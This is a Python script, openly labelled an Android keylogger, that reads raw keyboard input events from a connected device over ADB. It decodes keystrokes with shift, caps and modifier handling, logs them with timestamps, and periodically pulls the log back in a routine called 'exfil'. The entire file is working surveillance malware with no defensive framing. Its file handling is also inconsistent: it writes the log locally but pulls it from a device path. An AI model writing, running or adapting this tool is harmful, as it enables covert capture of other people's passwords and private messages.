#!/usr/bin/env python3
"""
Android Keylogger — ADB input event monitor
Full implementation: arch detection, event node detection,
shift/modifier combo tracking, timestamped log, auto-exfil.
"""

import subprocess
import struct
import sys
import time
import argparse
import os
from datetime import datetime

INPUT_EVENT_SIZE_64 = 24
INPUT_EVENT_SIZE_32 = 16

EV_KEY   = 0x01
KEY_DOWN = 1
KEY_HOLD = 2

# Modifier keycodes
MODIFIERS = {
    42: 'LSHIFT', 54: 'RSHIFT',
    29: 'LCTRL',  97: 'RCTRL',
    56: 'LALT',  100: 'RALT',
    125: 'LMETA', 126: 'RMETA',
}

KEYCODE_MAP = {
    2: ('1','!'), 3: ('2','@'), 4: ('3','#'), 5: ('4','$'),
    6: ('5','%'), 7: ('6','^'), 8: ('7','&'), 9: ('8','*'),
    10: ('9','('), 11: ('0',')'), 12: ('-','_'), 13: ('=','+'),
    14: '[BS]', 15: '[TAB]',
    16: ('q','Q'), 17: ('w','W'), 18: ('e','E'), 19: ('r','R'),
    20: ('t','T'), 21: ('y','Y'), 22: ('u','U'), 23: ('i','I'),
    24: ('o','O'), 25: ('p','P'), 26: ('[','{'), 27: (']','}'),
    28: '[ENTER]',
    30: ('a','A'), 31: ('s','S'), 32: ('d','D'), 33: ('f','F'),
    34: ('g','G'), 35: ('h','H'), 36: ('j','J'), 37: ('k','K'),
    38: ('l','L'), 39: (';',':'), 40: ("'",'"'), 41: ('`','~'),
    43: ('\\','|'),
    44: ('z','Z'), 45: ('x','X'), 46: ('c','C'), 47: ('v','V'),
    48: ('b','B'), 49: ('n','N'), 50: ('m','M'),
    51: (',','<'), 52: ('.','>'), 53: ('/','?'),
    57: ' ',
    58: '[CAPS]',
    103: '[UP]', 105: '[LEFT]', 106: '[RIGHT]', 108: '[DOWN]',
    111: '[ESC]', 113: '[MUTE]', 114: '[VOL-]', 115: '[VOL+]',
    116: '[POWER]', 139: '[MENU]', 158: '[BACK]',
    172: '[HOME]', 212: '[CAMERA]', 217: '[SEARCH]',
}


def adb_cmd(serial: str, *args) -> list:
    cmd = ['adb']
    if serial:
        cmd += ['-s', serial]
    cmd += list(args)
    return cmd


def adb_run(serial: str, *args, **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(adb_cmd(serial, *args),
                         capture_output=True, text=True, **kwargs)


def wait_for_device(serial: str, timeout: int = 30):
    print('[*] Waiting for device...')
    subprocess.run(adb_cmd(serial, 'wait-for-device'), timeout=timeout)
    print('[+] Device connected.')


def detect_event_node(serial: str) -> str:
    """Parse /proc/bus/input/devices, return first EV_KEY node."""
    r = adb_run(serial, 'shell', 'cat /proc/bus/input/devices')
    handlers, ev = [], ''
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith('H: Handlers='):
            handlers = line.split('=', 1)[1].split()
        elif line.startswith('B: EV='):
            ev = line.split('=', 1)[1].strip()
        elif line == '':
            try:
                if int(ev, 16) & (1 << EV_KEY):
                    for h in handlers:
                        if h.startswith('event'):
                            node = f'/dev/input/{h}'
                            print(f'[+] Found input node: {node}')
                            return node
            except ValueError:
                pass
            handlers, ev = [], ''
    print('[!] Could not auto-detect event node, falling back to event0')
    return '/dev/input/event0'


def detect_arch(serial: str) -> int:
    r = adb_run(serial, 'shell', 'uname -m')
    arch = r.stdout.strip()
    size = INPUT_EVENT_SIZE_64 if '64' in arch else INPUT_EVENT_SIZE_32
    print(f'[+] Device arch: {arch} → event struct size: {size} bytes')
    return size


def parse_event(data: bytes, event_size: int):
    if len(data) < event_size:
        return None
    fmt = '<qqHHi' if event_size == INPUT_EVENT_SIZE_64 else '<iiHHi'
    u = struct.unpack_from(fmt, data)
    return u[2], u[3], u[4]  # type, code, value


def resolve_key(code: int, shift: bool, caps: bool) -> str:
    entry = KEYCODE_MAP.get(code)
    if entry is None:
        return f'[KEY_{code}]'
    if isinstance(entry, str):
        return entry
    # tuple: (normal, shifted)
    normal, shifted = entry
    use_upper = shift ^ caps  # XOR: caps flips alpha, shift flips all
    return shifted if use_upper else normal


def run(serial: str, event_node: str, outfile: str, exfil_interval: int):
    event_size = detect_arch(serial)
    print(f'[*] Monitoring: {event_node}')
    print(f'[*] Logging to: {outfile}')
    if exfil_interval > 0:
        print(f'[*] Auto-exfil every {exfil_interval}s via adb pull')
    print('[*] Ctrl+C to stop.\n')

    proc = subprocess.Popen(
        adb_cmd(serial, 'shell', f'cat {event_node}'),
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    active_modifiers = set()
    caps_lock = False
    buf = b''
    last_exfil = time.time()

    with open(outfile, 'a', encoding='utf-8') as log:
        log.write(f'\n=== Session start: {datetime.now().isoformat()} ===\n')
        try:
            while True:
                chunk = proc.stdout.read(event_size * 16)
                if not chunk:
                    break
                buf += chunk

                while len(buf) >= event_size:
                    raw = buf[:event_size]
                    buf = buf[event_size:]
                    parsed = parse_event(raw, event_size)
                    if not parsed:
                        continue
                    ev_type, ev_code, ev_value = parsed

                    if ev_type != EV_KEY:
                        continue

                    # Track modifiers
                    if ev_code in MODIFIERS:
                        if ev_value in (KEY_DOWN, KEY_HOLD):
                            active_modifiers.add(ev_code)
                        else:  # key up
                            active_modifiers.discard(ev_code)
                        continue

                    # Caps lock toggle on key down
                    if ev_code == 58 and ev_value == KEY_DOWN:
                        caps_lock = not caps_lock
                        ts = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                        entry = f'[{ts}] [CAPS:{"ON" if caps_lock else "OFF"}]'
                        print(entry)
                        log.write(entry + '\n')
                        continue

                    if ev_value not in (KEY_DOWN, KEY_HOLD):
                        continue

                    shift = bool(active_modifiers & {42, 54})
                    ctrl  = bool(active_modifiers & {29, 97})
                    alt   = bool(active_modifiers & {56, 100})

                    char = resolve_key(ev_code, shift, caps_lock)

                    # Annotate ctrl/alt combos
                    if ctrl:
                        char = f'[CTRL+{char}]'
                    if alt:
                        char = f'[ALT+{char}]'

                    ts = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                    entry = f'[{ts}] {char}'
                    print(entry, end='', flush=True)
                    log.write(entry)
                    log.flush()

                # Auto-exfil
                if exfil_interval > 0 and (time.time() - last_exfil) >= exfil_interval:
                    log.flush()
                    exfil(serial, outfile)
                    last_exfil = time.time()

        except KeyboardInterrupt:
            print('\n[*] Stopped.')
            log.write(f'\n=== Session end: {datetime.now().isoformat()} ===\n')
        finally:
            proc.terminate()
            if exfil_interval > 0:
                exfil(serial, outfile)


def exfil(serial: str, remote_path: str):
    """Pull the log file from device to local machine."""
    local = os.path.basename(remote_path)
    r = adb_run(serial, 'pull', remote_path, local)
    if r.returncode == 0:
        print(f'\n[+] Exfil OK → {local}')
    else:
        print(f'\n[!] Exfil failed: {r.stderr.strip()}')


def main():
    parser = argparse.ArgumentParser(description='Android ADB keylogger')
    parser.add_argument('--serial',  default='',           help='ADB device serial')
    parser.add_argument('--event',   default='',           help='Event node (e.g. event1)')
    parser.add_argument('--out',     default='/data/local/tmp/kl.txt', help='Log path on device')
    parser.add_argument('--exfil',   default=60, type=int, help='Auto-pull interval in seconds (0=off)')
    parser.add_argument('--wait',    action='store_true',  help='Wait for device before starting')
    args = parser.parse_args()

    check = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
    if 'List of devices' not in check.stdout:
        print('[-] adb not found or not in PATH.')
        sys.exit(1)

    if args.wait:
        wait_for_device(args.serial)

    event_node = f'/dev/input/{args.event}' if args.event else detect_event_node(args.serial)
    run(args.serial, event_node, args.out, args.exfil)


if __name__ == '__main__':
    main()
